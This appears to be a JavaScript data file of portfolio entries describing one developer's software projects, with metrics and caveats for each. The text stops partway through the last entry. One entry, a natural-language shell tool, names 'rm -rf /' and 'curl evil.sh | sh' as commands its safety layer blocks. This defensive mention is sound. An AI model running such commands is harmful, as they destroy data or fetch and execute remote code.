/* 39 Verified Engineering Repositories - Advaith Narayana Sarva */
window.ALL_PROJECTS = [
  {
    "title": "The Sentinel Grid",
    "category": "Hackathon",
    "tagline": "When a flood hits, which ward do you rescue first?",
    "card": "Seven disaster types, one district, and a single ranked answer: where to send rescue teams and how to get people out. Built by our team of 4, placed top 5 in the South zone of the IBM BOB National Hackathon 2026.",
    "tags": [
      "Python",
      "Machine Learning",
      "Geospatial",
      "Hackathon",
      "Team"
    ],
    "stats": "Top 5 South zone · 314 automated checks passing · 0.9924 ROC-AUC on 473k real readings",
    "overview": "In a disaster, the most dangerous words are \"probably safe.\" The Sentinel Grid turns rainfall, terrain, population and infrastructure data for 30 wards of Coimbatore into risk zones, rescue priorities and evacuation routes. Its core idea is that \"we don't know yet\" gets its own zone and its own place in the rescue queue. Built by a team of four at the zonal round, SRCAS Coimbatore.",
    "highlights": [
      "**6 of 30 wards flagged as unverified** from an 11-hour-old satellite pass, each with the reason it couldn't be trusted.",
      "**2 errors caught in the specification itself** by independently recomputing all 104 formulas in a 681-line spec.",
      "**ROC-AUC 0.9924** detecting drought on 473,256 real district-month soil readings.",
      "**Called out our own weak spot:** monsoon extremes reach only ROC-AUC 0.662, and we named it the open problem instead of hiding it."
    ],
    "honest": "The landslide and cyclone models were trained on synthetic data, so their near-perfect scores aren't the headline. Next: live data feeds for per-ward detection.",
    "links": "https://github.com/advaithsarva/ibm-hackathon",
    "slug": "the-sentinel-grid"
  },
  {
    "title": "Multimodal Document Agent",
    "category": "AI Agents",
    "tagline": "Give it any PDF. It works out how to read it.",
    "card": "Scanned, digital or a mix of both, the agent picks the right way to read each document, then answers with the page and box it came from. It picked the right path every time and ran 13.5× faster than OCR-everything.",
    "tags": [
      "Python",
      "PDF",
      "OCR",
      "RAG",
      "Agents"
    ],
    "stats": "1.000 routing accuracy · 0.983 answer recall · 13.5× faster than always-OCR",
    "overview": "Most PDF tools guess wrong on stamped scans and half-scanned files, and then lose the whole document. This agent chooses between the text layer, OCR, a per-page hybrid or denoise-then-OCR for each PDF. It answers questions with page and bounding-box citations, and when the evidence isn't there, it says so.",
    "highlights": [
      "**Matched a perfect oracle** that was told the right path in advance, across 5 document types.",
      "**Caught a convincing fake:** a wrong answer that came with a real, valid citation. A new relevance gate now refuses all 3 such cases.",
      "**Cost nothing to route:** an area-ratio check picks the path for a 3-page PDF in 0.27 s without rendering anything.",
      "21 tests."
    ],
    "honest": "Benchmarked on generated fixtures. Next: a public document dataset.",
    "links": "https://github.com/advaithsarva/multimodal-document-agent",
    "slug": "multimodal-document-agent"
  },
  {
    "title": "Experiment Autopilot Agent",
    "category": "AI Agents",
    "tagline": "An AI researcher that writes down when it's wrong.",
    "card": "It trains a model, reads the curves, forms a hypothesis and tests it, then logs whether it was right. One in three of its hypotheses failed, and every failure is in the log.",
    "tags": [
      "Python",
      "Machine Learning",
      "Agents",
      "Experimentation"
    ],
    "stats": "33.4% hypotheses refuted and logged · 32 head-to-head benchmarks · +3.7 points from one insight",
    "overview": "Hyperparameter search tries things blindly. This agent diagnoses first (overfitting, underfitting, divergence, plateau, majority-class collapse), changes one thing as a stated hypothesis, and grades itself against what it predicted, not just whether the score went up.",
    "highlights": [
      "**Published the result that it lost:** random search won 0.9215 to 0.9145. The agent got there 27% faster, and every step is explained.",
      "**Separated noisy data from a too-small model,** which no single training curve can do. That was worth +3.7 points.",
      "**Didn't fall for fake accuracy:** it spots a model scoring 0.88 accuracy that is really just guessing the majority class.",
      "17 tests."
    ],
    "honest": "Random search still wins on final accuracy here. Next: close that gap without losing the audit trail.",
    "links": "https://github.com/advaithsarva/experiment-autopilot-agent",
    "slug": "experiment-autopilot-agent"
  },
  {
    "title": "Autonomous Recon Agent",
    "category": "AI Agents",
    "tagline": "Finds 2.4× more of a network with the same budget.",
    "card": "A reconnaissance agent that plans its own scans and spends every probe where it counts. At 250 probes it found 43.1% of services, where an nmap-style sweep found 18.0%.",
    "tags": [
      "Python",
      "Security",
      "Agents",
      "Search"
    ],
    "stats": "2.4× a standard sweep · 43.1% vs 18.0% services found · 22 tests",
    "overview": "Scanning everything is slow, and scanning the wrong target is illegal. This agent treats recon as a budgeted search: triage, identify, dig deeper, then sweep what's left. It runs on a simulated network, and there isn't a single socket in the code, so it can't reach a real machine.",
    "highlights": [
      "**Out of scope means refused:** scope is checked in two separate places, default-deny, so a typo can't scan someone else's network.",
      "**No evidence, no finding:** every finding carries the probe transcript that proves it.",
      "**Never loses to the simple approach:** fixed a plateau where a plain sweep had caught up."
    ],
    "honest": "Simulated network only, by design. JA3 fingerprinting is left unbuilt rather than faked.",
    "links": "https://github.com/advaithsarva/autonomous-recon-agent",
    "slug": "autonomous-recon-agent"
  },
  {
    "title": "IaC Drift Agent",
    "category": "AI Agents",
    "tagline": "Drift alerts you can actually trust.",
    "card": "It compares your live cloud with Terraform, ranks every difference by how much damage it could do, and fixes only what's safe to fix. Every alert was real: precision 1.000, where a plain diff scores 0.325.",
    "tags": [
      "Python",
      "DevOps",
      "Terraform",
      "Cloud",
      "Agents"
    ],
    "stats": "1.000 precision vs 0.325 · 8.3 false alarms per scan eliminated · 26 tests",
    "overview": "A plain diff raises about 8 false alarms per scan, because clouds change their own fields, and teams stop reading the alerts within a week. This agent filters with named rules you can audit, auto-fixes only changes that can't cause an outage, and asks a named person to approve the rest.",
    "highlights": [
      "**Every alert or suppression explains itself:** each dropped difference names the rule that dropped it.",
      "**Checks its own work** by re-scanning after a fix instead of trusting that the write happened.",
      "**Found a hidden severity bug:** a publicly exposed production database was rated \"high\" instead of \"critical\" in 27 of 100 scenarios."
    ],
    "honest": "Tested on 100 seeded scenarios. Next: a real cloud account.",
    "links": "https://github.com/advaithsarva/iac-drift-agent",
    "slug": "iac-drift-agent"
  },
  {
    "title": "Self-Healing System Agent",
    "category": "AI Agents",
    "tagline": "Fixes your machine, then checks the fix worked.",
    "card": "It learns what normal looks like, spots faults, repairs them within strict limits and measures again to confirm. Over 200 trials it never raised a false alarm and never missed a fault.",
    "tags": [
      "Python",
      "Operating Systems",
      "Monitoring",
      "Agents"
    ],
    "stats": "0 false alarms · 0 missed faults · 120/120 fixes verified",
    "overview": "Fixed thresholds fire too late or too often. This agent learns rolling baselines, names a root cause, and repairs only through a fixed list of allowed actions. Anything destructive needs a human, and system-critical processes are off-limits entirely.",
    "highlights": [
      "**Caught a memory leak 32 ticks earlier** than a threshold script tuned to its best.",
      "**Can't reason its way into disaster:** allowed actions are a fixed table, so no chain of logical-sounding steps ends with killing the database.",
      "**Won't confuse a spike with a leak:** fixed a diagnosis bug caused by a trend window that started before the fault."
    ],
    "honest": "Faults are injected in seeded trials. Next: real incident data.",
    "links": "https://github.com/advaithsarva/self-healing-system-agent",
    "slug": "self-healing-system-agent"
  },
  {
    "title": "Fact-Checking Agent",
    "category": "AI Agents",
    "tagline": "Paste an article. Get a verdict on every claim, with sources.",
    "card": "It breaks text into individual claims, hunts for evidence on each one, and returns Supported, Contradicted or Unverifiable with citations. It got 9 of 10 right, and the one miss is explained.",
    "tags": [
      "Python",
      "NLP",
      "NLI",
      "Agents"
    ],
    "stats": "9/10 verdicts correct · 15 tests · 0 API keys needed",
    "overview": "Articles mix facts, opinions and questions. This agent pulls out only the checkable facts, then searches, reads each evidence sentence to judge whether it supports or contradicts the claim, and weighs sources by reliability. It runs offline out of the box, with no paid search API.",
    "highlights": [
      "**Fixed two bugs that were hiding each other,** including evidence that clearly supported a claim being scored \"neutral.\"",
      "**Didn't game the eval:** traced the one miss to its root cause instead of tuning a threshold to hide it."
    ],
    "honest": "The gold set is 10 claims. Next: a larger public benchmark.",
    "links": "https://github.com/advaithsarva/fact-checking-agent",
    "slug": "fact-checking-agent"
  },
  {
    "title": "Autonomous Performance Agent",
    "category": "AI Agents",
    "tagline": "Finds your slowest Postgres query and makes it 11.7× faster.",
    "card": "It watches a live database, finds the slow queries, works out why, and proposes an index. With your approval it applies the fix, measures it, and rolls back automatically if it made things worse.",
    "tags": [
      "Python",
      "PostgreSQL",
      "Databases",
      "Agents"
    ],
    "stats": "11.7× faster (11.7 ms → 1.0 ms) · 8/8 eval cases · 200k-row table",
    "overview": "Slow queries hide in plain sight. The agent reads pg_stat_statements, rebuilds the real query behind Postgres's anonymised version, and tests a fix before and after. If a change hurts performance, it undoes it on its own.",
    "highlights": [
      "**Works on real-world queries:** safely reconstructs parameterised queries instead of skipping most of them.",
      "**Knows what not to build:** leaves join reordering to Postgres's own planner, which already does it better."
    ],
    "honest": "The 11.7× figure was measured in August 2026 on a Docker Postgres. Next: re-measure it.",
    "links": "https://github.com/advaithsarva/autonomous-performance-agent",
    "slug": "autonomous-performance-agent"
  },
  {
    "title": "Agentic Research Verifier",
    "category": "AI Agents",
    "tagline": "One agent researches, another fact-checks it, and a human breaks ties.",
    "card": "A researcher agent drafts claims, a verifier agent checks each one against its sources, and anything unproven pauses for a human before the report goes out. Built on LangGraph.",
    "tags": [
      "Python",
      "LangGraph",
      "Multi-Agent",
      "Pydantic"
    ],
    "stats": "2 agents · 1 real human-approval pause · 7/7 scenario tests",
    "overview": "AI research tools state things confidently whether or not they're true. Here, the claims have to survive a second agent before anyone sees them, and the human-approval pause is a real stop in the graph, not a simulation. Built-in limits on tokens and revisions stop it running forever.",
    "highlights": [
      "**Found a LangGraph bug through testing:** changes made inside a routing function silently vanish.",
      "**Remembers past research,** even when a new question is worded differently.",
      "**Structured, validated output** checked by Pydantic before publishing."
    ],
    "honest": "Runs offline on a small two-topic corpus by default. Next: wire in the live model path.",
    "links": "https://github.com/advaithsarva/agentic-research-verifier",
    "slug": "agentic-research-verifier"
  },
  {
    "title": "Agentic AI Foundations",
    "category": "AI Agents",
    "tagline": "AI agents with the framework taken away.",
    "card": "A ReAct agent and a self-correcting memory agent, built with nothing but raw HTTPS calls to the model API. No SDK, no framework, and both run without an API key.",
    "tags": [
      "Python",
      "Agents",
      "ReAct",
      "ChromaDB"
    ],
    "stats": "0 frameworks · 2 swappable memory backends · 0 keys needed to run",
    "overview": "Frameworks make agents easy and hide how they work. These two agents show every step: the think-act-observe loop, tool calls checked against a schema, and a memory that swaps between ChromaDB and a plain file without changing a single result.",
    "highlights": [
      "**Safe by construction:** the calculator tool parses math with a restricted AST, never eval.",
      "**Same answers either way:** both memory backends return identical scores.",
      "**Found a bug hiding inside a bug fix** by running two queries back to back."
    ],
    "honest": "These demonstrate how agents work, so there's no benchmark score.",
    "links": "https://github.com/advaithsarva/agentic-ai-foundations",
    "slug": "agentic-ai-foundations"
  },
  {
    "title": "Local PDF RAG",
    "category": "NLP & RAG",
    "tagline": "Ask a 1,208-page textbook anything, and check every citation.",
    "card": "Question answering over a full nutrition textbook, entirely on a laptop CPU. Every answer quotes the exact page it came from, after I found a bug that had quietly corrupted 21% of the original index.",
    "tags": [
      "Python",
      "RAG",
      "Sentence Transformers",
      "PyMuPDF",
      "NLP"
    ],
    "stats": "100% exact-quote chunks (was 79%) · 12/12 off-topic questions refused · 23 tests",
    "overview": "A citation is worthless if the quoted text isn't really on that page. This system runs with no GPU, no API key and no vector database, and it's built on one rule: every chunk is a real slice of its page. If that rule breaks, the build stops.",
    "highlights": [
      "**Found a bug inherited from a popular tutorial** that glued sentences together (\"clear?Yes\") and broke 21% of chunks. Now 1,715 out of 1,715 are exact.",
      "**Knows when to say \"I don't know\":** it refused all 12 out-of-scope questions and still answered all 34 in-scope ones.",
      "**Let the evidence decide:** a simple keyword search beat the AI retriever on one test (0.990 vs 0.971), and an LLM answer layer lost on grounding (0.632 vs 1.000). Both results are published, and the better option ships.",
      "**Fine-tuned the retriever** and showed both sides: better in-domain (0.952 → 1.000), worse on real questions (1.000 → 0.912)."
    ],
    "honest": "Grounding shows where the words came from, not whether they're true, so there's no factual-accuracy score.",
    "links": "https://github.com/advaithsarva/local-pdf-rag",
    "slug": "local-pdf-rag"
  },
  {
    "title": "Graph RAG Knowledge System",
    "category": "NLP & RAG",
    "tagline": "Answers the questions that take two hops to find.",
    "card": "Keyword search, meaning search and a knowledge graph, fused into one cited answer. The hybrid beat each method on its own (MRR 0.900 vs 0.867 and 0.733).",
    "tags": [
      "Python",
      "RAG",
      "Knowledge Graph",
      "spaCy",
      "NetworkX"
    ],
    "stats": "0.900 MRR hybrid · beats 0.867 and 0.733 · 10 tests",
    "overview": "Ordinary search finds documents that mention your words. It can't connect \"who acquired the company that makes X?\" across two documents. This system builds a knowledge graph from the text and walks it, with no database server and no credentials.",
    "highlights": [
      "**Fixed backwards facts:** \"Acme was acquired by Globex\" had been extracted the wrong way round.",
      "**Picked a metric that could tell methods apart** after the first one scored everything 5/5."
    ],
    "honest": "The eval is 5 queries, so it's directional. Next: a larger multi-hop set.",
    "links": "https://github.com/advaithsarva/graph-rag-knowledge-system",
    "slug": "graph-rag-knowledge-system"
  },
  {
    "title": "Docs Knowledge Graph Q&A",
    "category": "NLP & RAG",
    "tagline": "A dead hackathon project, brought back and made safe.",
    "card": "Ask questions about 160 documentation pages. Each one is answered by a text lookup or by running a real graph algorithm over how the pages link together.",
    "tags": [
      "Python",
      "NetworkX",
      "Flask",
      "Knowledge Graph"
    ],
    "stats": "0.925 routing accuracy · 1.000 algorithm choice · dependencies 10 → 3",
    "overview": "The original hackathon code couldn't even start: every file tried to connect to a database that had expired. I rebuilt it so nothing connects at import time, replaced an LLM router with rules, and made the graph algorithms actually run.",
    "highlights": [
      "**Closed a code-execution hole** where model output was run directly as a function name, and removed a public database password.",
      "**Found why PageRank was a five-way tie:** it was ranking the navigation sidebar. Spurious links dropped from 8,785 to 239.",
      "**Proven better than the original:** the same tests pass 10/10 on the rebuild and fail 8/8 on the old code."
    ],
    "honest": "The routing eval was written by the same person who wrote the rules.",
    "links": "https://github.com/advaithsarva/docs-knowledge-graph-qa",
    "slug": "docs-knowledge-graph-q-a"
  },
  {
    "title": "Multilingual Sentiment Pipeline",
    "category": "NLP & RAG",
    "tagline": "One model reads the mood in four languages.",
    "card": "English, Hindi, Spanish and Telugu, all handled by a single model. It detects the language, scores every sentence's sentiment and emotion, tags names and places, and draws it all as one heatmap.",
    "tags": [
      "Python",
      "NLP",
      "Transformers",
      "Multilingual",
      "spaCy"
    ],
    "stats": "4 languages · 1 model · 10 tests",
    "overview": "Most pipelines need a separate model for every language. This one uses a single multilingual model, so adding a language is a small change rather than a new project. The result is one self-contained HTML report you can open anywhere.",
    "highlights": [
      "**Didn't let Telugu fail silently:** the sentence splitter has no Telugu support, so I built and tested a fallback.",
      "**Highlights land on exactly the right words:** a test checks every sentence maps back to its exact place in the original text."
    ],
    "honest": "The 20/20 sentiment check uses clear-cut sentences, so it's a sanity check. Telugu isn't scored yet.",
    "links": "https://github.com/advaithsarva/multilingual-sentiment-pipeline",
    "slug": "multilingual-sentiment-pipeline"
  },
  {
    "title": "Newsgroup Text Classifier",
    "category": "NLP & RAG",
    "tagline": "The old results were broken. These ones hold up.",
    "card": "Classifies and clusters 20 Newsgroups posts with a linear SVM, KMeans and LDA. It's a rebuild of a project whose original numbers turned out to be invalid.",
    "tags": [
      "Python",
      "scikit-learn",
      "NLP",
      "Topic Modelling"
    ],
    "stats": "0.706 accuracy · 0.694 macro F1 over 20 classes · 20 tests",
    "overview": "A classic dataset has a classic trap: the headers name the answer. This version strips them out and uses the official time-based split. That costs about 25 accuracy points and measures what actually matters. Clusters and topics come with names and an interactive map.",
    "highlights": [
      "**Found why every original result was wrong:** cleaning had merged the entire corpus into one document.",
      "**Caught a wrong model:** the saved \"newsgroup classifier\" was really a movie-review sentiment model.",
      "**Slimmed down** to just two dependencies."
    ],
    "honest": "The hardest classes differ by opinion, not vocabulary (religion, politics), and that's where it struggles.",
    "links": "https://github.com/advaithsarva/newsgroup-text-classifier",
    "slug": "newsgroup-text-classifier"
  },
  {
    "title": "Media NLP Pipeline",
    "category": "NLP & RAG",
    "tagline": "Spots spin in the news, and quotes the exact words.",
    "card": "23 detectors flag bias, logical fallacies and propaganda techniques in news text. Every flag points to the exact words that triggered it, so you can check each call yourself.",
    "tags": [
      "Python",
      "NLP",
      "spaCy",
      "FastAPI",
      "Ray"
    ],
    "stats": "23 detectors · 100% of findings quote exact source text · 164 tests",
    "overview": "An accusation of bias is only useful if you can see the evidence. This pipeline gives the same output on every run, and every finding carries the exact quote and its position in the article. Rules and scoring live in config files, so you can change them without touching code.",
    "highlights": [
      "**Caught a 5× scoring error in the spec** and shipped a corrected formula alongside the original.",
      "**Rarely cries wolf:** 0.175 false flags per 1,000 words of Wikipedia.",
      "**Holds back weak detectors:** nine categories are parked rather than shipped as noise."
    ],
    "honest": "No validated accuracy score yet. Benchmarking against the BABE dataset is in progress.",
    "links": "https://github.com/advaithsarva/media-nlp-pipeline",
    "slug": "media-nlp-pipeline"
  },
  {
    "title": "Telugu-English Code-Mix",
    "category": "NLP & RAG",
    "tagline": "How people really text: half Telugu, half English, translated.",
    "card": "Translates mixed Telugu-English text into Hindi with Meta's NLLB-200 and scores it with metrics written from scratch. Along the way it exposed a million-sentence dataset as fake.",
    "tags": [
      "Python",
      "NLP",
      "NLLB-200",
      "Indic Languages"
    ],
    "stats": "5 silent bugs fixed · 1M-sentence fake corpus exposed · 45 tests",
    "overview": "Millions of people mix languages in every message, and most NLP tools choke on it. This pipeline cleans mixed-script text, translates it, embeds it and scores the result. The scoring core uses only the standard library.",
    "highlights": [
      "**Found that cleaning erased all of the Telugu** without raising a single error.",
      "**Fixed a translator talking to itself:** the model had been given the wrong language code all along.",
      "**Exposed a fake dataset:** the audit showed 1 million sentences were randomly generated from 36 words."
    ],
    "honest": "No translation score until it's re-run on a real corpus (LinCE, GLUECoS or L3Cube).",
    "links": "https://github.com/advaithsarva/telugu-english-codemix",
    "slug": "telugu-english-code-mix"
  },
  {
    "title": "Natural Language Shell",
    "category": "NLP & RAG",
    "tagline": "Talk to Linux in English. The AI never gets the last word.",
    "card": "Type what you want in plain English and get the Linux command. Before anything runs, a local safety check blocks dangerous commands, whatever the AI says.",
    "tags": [
      "Python",
      "Docker",
      "LLM",
      "Security",
      "CLI"
    ],
    "stats": "20/20 safety cases · 15 attacks now blocked · 1 dependency",
    "overview": "Letting an AI run shell commands is one bad answer away from rm -rf /. Here the model only suggests. A local rulebook decides, and nothing runs unless you ask for it with --run.",
    "highlights": [
      "**Closed a remote code execution hole:** rm -rf /, curl evil.sh | sh and edits to /etc/hosts are all refused.",
      "**Fixed a Docker build that had never worked,** and it now runs as a non-root user."
    ],
    "honest": "Translation accuracy isn't measured yet. Next: a labelled set of instructions.",
    "links": "https://github.com/advaithsarva/natural-language-shell",
    "slug": "natural-language-shell"
  },
  {
    "title": "Document Layout Intelligence",
    "category": "ML & Data",
    "tagline": "Reads two-column PDFs in the right order, every time.",
    "card": "Turns any PDF into clean, structured data: titles, headings, lists, tables and figures, in reading order. Perfect order on every test page, where PyMuPDF's own sort scores 0.566.",
    "tags": [
      "Python",
      "Computer Vision",
      "PDF",
      "Document AI"
    ],
    "stats": "1.000 reading order vs 0.566 · 0.992 recall · 22 tests",
    "overview": "Multi-column PDFs trip up almost every extractor. Text comes out jumbled, or silently goes missing. This system gets the order right and accounts for every piece of text, reporting coverage next to every score so nothing can vanish unnoticed.",
    "highlights": [
      "**Fixed the textbook algorithm itself:** standard XY-cut scrambles two-column pages whose paragraphs break at the same height.",
      "**Added AI only where it pays:** a learned classifier ties the rules on digital PDFs and beats them on scans (0.9840 vs 0.9572).",
      "**Built only what was missing:** measured the existing table finder first, then filled its one gap."
    ],
    "honest": "Ground truth is 36 pages built for this project. Next: a public layout benchmark.",
    "links": "https://github.com/advaithsarva/document-layout-intelligence",
    "slug": "document-layout-intelligence"
  },
  {
    "title": "Realtime Object Tracker",
    "category": "ML & Data",
    "tagline": "It never loses track of who's who.",
    "card": "Follows many moving objects at once and keeps every ID stable. Zero identity switches across four test scenes, including a crowd.",
    "tags": [
      "Python",
      "Computer Vision",
      "Kalman Filter",
      "NumPy"
    ],
    "stats": "0 ID switches · 1.000 identity purity · MOTA 0.980–0.985",
    "overview": "A tracker that renumbers people every few frames looks fine in each frame and is useless overall. This ByteTrack-style tracker predicts motion with a Kalman filter, matches in two stages, and measures identity, not just boxes.",
    "highlights": [
      "**Crowd scene: 76 ID switches down to 0,** after fixing a bug that made track aging impossible.",
      "**Found an inverted threshold** that had sunk accuracy to 0.010 while every part looked correct on its own.",
      "**Detector is plug-and-play,** so tracking is measured separately from detection. 23 tests."
    ],
    "honest": "Tested on synthetic scenes. Next: a public MOT benchmark video.",
    "links": "https://github.com/advaithsarva/realtime-object-tracker",
    "slug": "realtime-object-tracker"
  },
  {
    "title": "Healthcare Utilization Risk Pipeline",
    "category": "ML & Data",
    "tagline": "Flags heart risk before it becomes an ER visit.",
    "card": "A full analytics pipeline, from raw data to a live dashboard, that ranks patients by cardiac risk so care teams know who to call first. ROC-AUC 0.8801.",
    "tags": [
      "Python",
      "SQL",
      "scikit-learn",
      "Streamlit",
      "Healthcare"
    ],
    "stats": "0.8801 ROC-AUC · 0.9051 PR-AUC · 7/7 tests on real data",
    "overview": "Care teams can't call everyone, so they need to know who to call first. This pipeline loads patient data into SQLite, engineers features in SQL, trains a Random Forest, and serves the results in a Streamlit dashboard. Every modelling choice was made by measuring the data, not by following a checklist.",
    "highlights": [
      "**Skipped rebalancing on purpose:** the measured class ratio (1.196:1) didn't need it.",
      "**Used PCA only where it helps:** for the dashboard plot, not the model.",
      "**Dashboard never retrains:** it reads saved results, so it's fast and consistent."
    ],
    "honest": "303 patients is small, so this proves the pipeline, not a clinical model.",
    "links": "https://github.com/advaithsarva/healthcare-utilization-risk-pipeline",
    "slug": "healthcare-utilization-risk-pipeline"
  },
  {
    "title": "Air Quality Forecasting",
    "category": "ML & Data",
    "tagline": "Linear regression beat the LSTM, and here's the proof.",
    "card": "Forecasts tomorrow's air pollution from four years of real Beijing weather data. Three models go head to head, and the simplest one wins.",
    "tags": [
      "Python",
      "Time Series",
      "PyTorch",
      "scikit-learn"
    ],
    "stats": "MAE 41.47 linear vs 44.97 LSTM · 5-fold walk-forward · 7/7 tests",
    "overview": "Deep learning isn't always the answer, and this project measures it. Using 43,824 hourly readings and strict walk-forward validation (no peeking at the future), it compares a seasonal baseline, linear regression and a tuned LSTM.",
    "highlights": [
      "**Honest winner:** linear regression, MAE 41.47. The LSTM beats the naive baseline but not linear.",
      "**Found and fixed a scaling bug** that had made the first LSTM worse than every baseline (MAE 86.7)."
    ],
    "honest": "Forecasts are daily, not hourly, and the LSTM search was kept small.",
    "links": "https://github.com/advaithsarva/air-quality-multivariate-forecasting",
    "slug": "air-quality-forecasting"
  },
  {
    "title": "Experiment Tracking Dashboard",
    "category": "ML & Data",
    "tagline": "Kill bad training runs early and save half your compute.",
    "card": "A zero-setup experiment tracker that survives crashes and spots failing runs early. It caught every bad run and saved 55.1% of their compute.",
    "tags": [
      "Python",
      "SQLite",
      "MLOps"
    ],
    "stats": "100% bad runs caught · 55.1% compute saved · 16.7% false alarms",
    "overview": "No server, no account, no install: just SQLite. A test kills the process mid-run to prove not a single metric is lost. Detectors watch each run and flag it before it wastes hours.",
    "highlights": [
      "**Crash-proof, and tested that way:** all 50 metrics survive a hard kill.",
      "**One fix for four bugs:** a moving median took detection from 11/20 to 18/20.",
      "**Shows the cost next to the win:** the 16.7% false-alarm rate is published beside the savings."
    ],
    "honest": "Measured on 60 seeded runs. Next: real training jobs.",
    "links": "https://github.com/advaithsarva/experiment-tracking-dashboard",
    "slug": "experiment-tracking-dashboard"
  },
  {
    "title": "Transformer from Scratch",
    "category": "Systems from Scratch",
    "tagline": "Every layer of a GPT-style model, written by hand and proven correct.",
    "card": "A transformer built without PyTorch's ready-made pieces. Every hand-written layer matches the official version to within 0.00001, and the model gets within 0.6% of the best loss mathematically possible.",
    "tags": [
      "Python",
      "PyTorch",
      "Deep Learning",
      "Transformers"
    ],
    "stats": "1e-5 match to PyTorch · 1.0059× the theoretical best · 19 tests",
    "overview": "\"From scratch\" usually means \"trust me.\" Here it's tested: attention, LayerNorm and GELU are all hand-written and checked against the built-ins they replace. Training data with a known entropy gives the loss a hard floor to aim at.",
    "highlights": [
      "**Proved it can't cheat:** a causality test is shown to catch a deliberately leaky model.",
      "**Published three experiments that failed,** including a copy task stuck at chance.",
      "**A six-way ablation found nothing,** and the write-up explains exactly why."
    ],
    "honest": "On the simplest data, a counting model is optimal and edges out the transformer.",
    "links": "https://github.com/advaithsarva/transformer-from-scratch",
    "slug": "transformer-from-scratch"
  },
  {
    "title": "TCP Stack from Scratch",
    "category": "Systems from Scratch",
    "tagline": "The internet's core protocol, rebuilt from raw bytes.",
    "card": "TCP written from scratch in plain Python: handshake, retransmission, congestion control and all. Your data arrives byte-perfect even when 30% of packets are lost.",
    "tags": [
      "Python",
      "Networking",
      "Protocols"
    ],
    "stats": "30% packet loss survived · 16× faster than stop-and-wait · 28 tests",
    "overview": "TCP is the protocol almost everything relies on, and almost nobody has built. This stack implements the full RFC 793 lifecycle with no socket in the protocol code. An injected clock makes a 60-second timeout testable in microseconds.",
    "highlights": [
      "**Fixed three bugs that hang silently,** including a handshake deadlock when the final ACK is lost.",
      "**Measured, not assumed:** fast retransmit recovers 1.32× faster, and throughput collapses 6,600× between 5% and 20% loss."
    ],
    "honest": "Runs over a simulated link, not a real network card.",
    "links": "https://github.com/advaithsarva/tcp-stack-from-scratch",
    "slug": "tcp-stack-from-scratch"
  },
  {
    "title": "Mini Container Orchestrator",
    "category": "Systems from Scratch",
    "tagline": "A working mini-Kubernetes, in plain Python.",
    "card": "Schedules containers, heals them, rolls out updates and rolls back bad ones on its own. When a node dies, all 6 pods survive.",
    "tags": [
      "Python",
      "Distributed Systems",
      "Kubernetes Concepts"
    ],
    "stats": "6/6 pods survive node death · ≥3/4 ready during every rollout · 25 tests",
    "overview": "The ideas behind Kubernetes, built from the ground up: a versioned state store, a bin-packing scheduler, controllers that keep reconciling, and a kubectl-style CLI. Compare-and-swap makes the classic \"two controllers, four pods\" race impossible.",
    "highlights": [
      "**Rolls back bad deploys by itself:** a broken image returns to 3/3 healthy.",
      "**Solved the mystery of a cluster that did nothing:** mismatched clocks had made every node look dead."
    ],
    "honest": "The real Docker runtime is written but untested, since no Docker daemon was available.",
    "links": "https://github.com/advaithsarva/mini-container-orchestrator",
    "slug": "mini-container-orchestrator"
  },
  {
    "title": "Mini DB Engine",
    "category": "Systems from Scratch",
    "tagline": "A real database, with no database library underneath.",
    "card": "Storage, indexing, crash recovery and a SQL parser, all built from scratch in Python. Commit your data, crash, reopen, and it's all still there.",
    "tags": [
      "Python",
      "Databases",
      "Storage Engines"
    ],
    "stats": "8/8 eval cases · B+tree index · crash-safe WAL",
    "overview": "How does a database actually keep your data safe? This engine answers that with 4 KB pages, a B+tree index, an LRU buffer pool, write-ahead logging and transactions. A no-steal, force-at-commit design means recovery only ever has to redo, never undo.",
    "highlights": [
      "**Crash recovery made simple** by designing the buffer policy around it.",
      "**Index proven under pressure** by forcing multiple root splits."
    ],
    "honest": "A learning engine, not tuned for speed or concurrency.",
    "links": "https://github.com/advaithsarva/mini-db-engine",
    "slug": "mini-db-engine"
  },
  {
    "title": "CPU Scheduler Simulator",
    "category": "Systems from Scratch",
    "tagline": "Picking the right scheduler cuts waiting time nearly in half.",
    "card": "Runs five classic CPU scheduling algorithms on the same workload and shows the difference as Gantt charts. Choosing the best one per workload cut waiting time by up to 48.9%.",
    "tags": [
      "Python",
      "Operating Systems",
      "Algorithms"
    ],
    "stats": "up to 48.9% less waiting · 1,500 workloads tested · 0 made worse",
    "overview": "FCFS, SJF, SRTF, Round Robin and Priority, side by side. Correctness is checked by a strict timeline rule across 200 random workloads, not by eyeballing averages. It runs on plain Python with nothing to install.",
    "highlights": [
      "**Measured the payoff:** 40.9–48.9% less waiting than the round-robin default, and no workload got worse.",
      "**See it:** viewer.html draws the timeline in your browser."
    ],
    "honest": "Workloads are synthetic.",
    "links": "https://github.com/advaithsarva/cpu-scheduler-simulator",
    "slug": "cpu-scheduler-simulator"
  },
  {
    "title": "Protocol Dissector Dashboard",
    "category": "Systems from Scratch",
    "tagline": "Wireshark-style packet analysis, built with no packet library.",
    "card": "Opens packet captures and shows every protocol, every conversation, and anything suspicious, down to the exact packet. It's parsed from raw bytes, with no Scapy or libpcap.",
    "tags": [
      "Python",
      "Networking",
      "Security",
      "Packet Analysis"
    ],
    "stats": "1/1 hidden scanner found · 0 false alarms · 29 tests",
    "overview": "Capture files can lie about their own lengths, and a careless parser will read the next packet as this one's data without ever crashing. This dissector treats every length field as hostile and checks every read, from Ethernet up to the application layer.",
    "highlights": [
      "**Found the planted port scanner** with zero false alarms.",
      "**Every alert shows its receipts:** the packet numbers behind it.",
      "**Survives malformed input:** 8 deliberately broken frames are handled cleanly."
    ],
    "honest": "Live capture needs raw-socket access and hasn't been run yet.",
    "links": "https://github.com/advaithsarva/protocol-dissector-dashboard",
    "slug": "protocol-dissector-dashboard"
  },
  {
    "title": "Document Data Extractor",
    "category": "Full-Stack",
    "tagline": "Drop in a document, get clean data back.",
    "card": "Upload a PDF, scan, photo or text file and get names, dates, places, emails, phone numbers and tables back as clean JSON. It found every field in the tests, across 90 documents with zero failures.",
    "tags": [
      "React",
      "Flask",
      "OCR",
      "spaCy",
      "Python"
    ],
    "stats": "1.00 recall · 0 failures in 90 docs · address recall 0.10 → 1.00",
    "overview": "The original version couldn't even read its own sample file. The rebuild reads text layers with PyMuPDF, falls back to OCR for scans, and pulls out entities with spaCy and pattern matching. Your file is processed in memory and never saved to disk.",
    "highlights": [
      "**Nine defects, two root causes,** found and fixed.",
      "**Faster and more accurate:** a smaller model raised name precision from 0.73 to 0.97 and runs 7× faster.",
